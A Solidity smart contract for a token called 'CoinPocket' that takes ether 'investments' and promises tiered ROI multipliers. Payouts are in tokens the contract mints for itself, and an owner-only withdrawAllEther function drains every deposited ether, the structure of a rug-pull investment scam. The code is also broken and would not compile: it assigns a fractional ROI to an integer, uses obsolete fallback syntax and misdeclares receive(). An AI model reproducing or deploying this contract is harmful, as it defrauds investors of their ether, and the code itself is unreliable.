pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract CoinPocket is ERC20 {
    constructor() ERC20("CoinPocket", "CP") public {
        _mint(address(this), 500000000000000000);
        owner = msg.sender;
    }
    
    address public owner;
    mapping (address => uint256) private investments;
    mapping (address => uint256) private lastInvestTime;
    mapping (address => uint256) private ROI;
    mapping (address => uint256) private withdrawDuration;

    function invest() public payable {
        lastInvestTime[msg.sender] = block.timestamp;
        investments[msg.sender] += msg.value;

        if (msg.value >= 50000) {
            ROI[msg.sender] = 5;
            withdrawDuration[msg.sender] = 50 days;
        } else if (msg.value >= 20000) {
            ROI[msg.sender] = 4;
            withdrawDuration[msg.sender] = 6 days;
        } else if (msg.value >= 5000) {
            ROI[msg.sender] = 3;
            withdrawDuration[msg.sender] = 6 days;
        } else if (msg.value >= 300) {
            ROI[msg.sender] = 2.5;
            withdrawDuration[msg.sender] = 6 days;
        }
    }


    function withdraw() public {
        require(block.timestamp >= lastInvestTime[msg.sender] + withdrawDuration[msg.sender], "Duration not yet completed");
        require(investments[msg.sender] > 0, "No investments to withdraw");

        address user = msg.sender;
        uint256 amount = investments[user] * ROI[msg.sender];
        _transfer(address(this), user, amount);
        investments[user] = 0;
    }

    function getProfit() public view returns (uint256) {
        return investments[msg.sender] * ROI[msg.sender];
    }
    
      function withdrawAllEther() public {
        require(msg.sender == owner, "Only the contract owner can withdraw ether");
        require(address(this).balance > 0, "The contract has no ether to withdraw");

        // Send all ether held by the contract to the owner's address
        msg.sender.transfer(address(this).balance);
    }
    
    function receive() external payable {
        lastInvestTime[msg.sender] = block.timestamp;
        investments[msg.sender] += msg.value;
    }

    function() external payable {
        receive();
    }
}
